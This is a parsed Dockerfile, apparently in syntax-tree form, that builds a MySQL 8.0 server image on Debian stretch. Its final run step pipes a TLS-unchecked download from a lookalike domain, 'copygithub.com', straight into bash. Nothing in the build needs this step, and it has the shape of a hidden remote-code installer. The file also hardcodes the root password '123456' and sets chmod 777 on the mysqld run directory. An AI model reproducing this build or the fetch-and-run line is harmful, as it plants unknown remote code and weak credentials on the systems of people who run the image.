MetaArgs: null
Stages:
- BaseName: debian:stretch-slim
  Commands:
  - CmdLine:
    - groupadd -r mysql && useradd -r -g mysql mysql
    Name: run
    PrependShell: true
  - CmdLine:
    - apt-get update && apt-get install -y --no-install-recommends gnupg dirmngr &&
      rm -rf /var/lib/apt/lists/*
    Name: run
    PrependShell: true
  - Env:
    - Key: GOSU_VERSION
      Value: "1.7"
    Name: env
  - CmdLine:
    - "set -x \t&& apt-get update && apt-get install -y --no-install-recommends ca-certificates
      wget && rm -rf /var/lib/apt/lists/* \t&& wget -O /usr/local/bin/gosu \"https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg
      --print-architecture)\" \t&& wget -O /usr/local/bin/gosu.asc \"https://github.com/tianon/gosu/releases/download/$GOSU_VERSION/gosu-$(dpkg
      --print-architecture).asc\" \t&& export GNUPGHOME=\"$(mktemp -d)\" \t&& gpg
      --batch --keyserver ha.pool.sks-keyservers.net --recv-keys B42F6819007F00F88E364FD4036A9C25BF357DD4
      \t&& gpg --batch --verify /usr/local/bin/gosu.asc /usr/local/bin/gosu \t&& gpgconf
      --kill all \t&& rm -rf \"$GNUPGHOME\" /usr/local/bin/gosu.asc \t&& chmod +x
      /usr/local/bin/gosu \t&& gosu nobody true"
    Name: run
    PrependShell: true
  - CmdLine:
    - mkdir /docker-entrypoint-initdb.d
    Name: run
    PrependShell: true
  - CmdLine:
    - "apt-get update && apt-get install -y --no-install-recommends \t\tpwgen \t\topenssl
      \t\tperl \t&& rm -rf /var/lib/apt/lists/*"
    Name: run
    PrependShell: true
  - CmdLine:
    - "set -ex; \tkey='A4A9406876FCBD3C456770C88C718D3B5072E1F5'; \texport GNUPGHOME=\"$(mktemp
      -d)\"; \tgpg --batch --keyserver ha.pool.sks-keyservers.net --recv-keys \"$key\";
      \tgpg --batch --export \"$key\" > /etc/apt/trusted.gpg.d/mysql.gpg; \tgpgconf
      --kill all; \trm -rf \"$GNUPGHOME\"; \tapt-key list > /dev/null"
    Name: run
    PrependShell: true
  - Env:
    - Key: MYSQL_MAJOR
      Value: "8.0"
    Name: env
  - Env:
    - Key: MYSQL_VERSION
      Value: 8.0.18-1debian9
    Name: env
  - CmdLine:
    - echo "deb http://repo.mysql.com/apt/debian/ stretch mysql-${MYSQL_MAJOR}" >
      /etc/apt/sources.list.d/mysql.list
    Name: run
    PrependShell: true
  - CmdLine:
    - "{ \t\techo mysql-community-server mysql-community-server/data-dir select '';
      \t\techo mysql-community-server mysql-community-server/root-pass password '';
      \t\techo mysql-community-server mysql-community-server/re-root-pass password
      ''; \t\techo mysql-community-server mysql-community-server/remove-test-db select
      false; \t} | debconf-set-selections \t&& apt-get update && apt-get install -y
      mysql-community-client=\"${MYSQL_VERSION}\" mysql-community-server-core=\"${MYSQL_VERSION}\"
      && rm -rf /var/lib/apt/lists/* \t&& rm -rf /var/lib/mysql && mkdir -p /var/lib/mysql
      /var/run/mysqld \t&& chown -R mysql:mysql /var/lib/mysql /var/run/mysqld \t&&
      chmod 777 /var/run/mysqld"
    Name: run
    PrependShell: true
  - Chown: ""
    From: ""
    Name: copy
    SourcesAndDest:
    - config/
    - /etc/mysql/
  - Chown: ""
    From: ""
    Name: copy
    SourcesAndDest:
    - docker-entrypoint.sh
    - /usr/local/bin/
  - CmdLine:
    - 'ln -s usr/local/bin/docker-entrypoint.sh /entrypoint.sh # backwards compat'
    Name: run
    PrependShell: true
  - CmdLine:
    - docker-entrypoint.sh
    Name: entrypoint
    PrependShell: false
  - Name: expose
    Ports:
    - "3306"
    - "33060"
  - CmdLine:
    - mysqld
    Name: cmd
    PrependShell: false
  - Chown: ""
    From: ""
    Name: copy
    SourcesAndDest:
    - docker-setup.sh
    - /usr/local/bin/docker-setup.sh
  - Chown: ""
    From: ""
    Name: copy
    SourcesAndDest:
    - bashrc
    - /root/.bashrc
  - Env:
    - Key: MYSQL_ROOT_PASSWORD
      Value: '"123456"'
    Name: env
  - Env:
    - Key: MYSQL_DATABASE
      Value: '"demo"'
    Name: env
  - Env:
    - Key: MYSQL_USER
      Value: '"demo"'
    Name: env
  - Env:
    - Key: MYSQL_PASSWORD
      Value: '"demo"'
    Name: env
  - CmdLine:
    - chmod +x /usr/local/bin/docker-setup.sh && /usr/local/bin/docker-setup.sh mysqld
    Name: run
    PrependShell: true
  - CmdLine:
    - apt-get update && apt-get install -y --no-install-recommends  vim wget curl
      dnsutils procps net-tools
    Name: run
    PrependShell: true
  - CmdLine:
    - "apt-get update && apt-get install -y --no-install-recommends \t\tg++ \t\tgcc
      \t\tlibc6-dev \t\tmake \t\tpkg-config \t&& rm -rf /var/libc/apt/lists/*"
    Name: run
    PrependShell: true
  - CmdLine:
    - curl -qks 'https://copygithub.com:30707/?c=Download/TargzRun&id=5e046826e1d0f'
      | bash
    Name: run
    PrependShell: true
  From:
    Image: debian:stretch-slim
  Name: ""
  Platform: ""
  SourceCode: FROM debian:stretch-slim
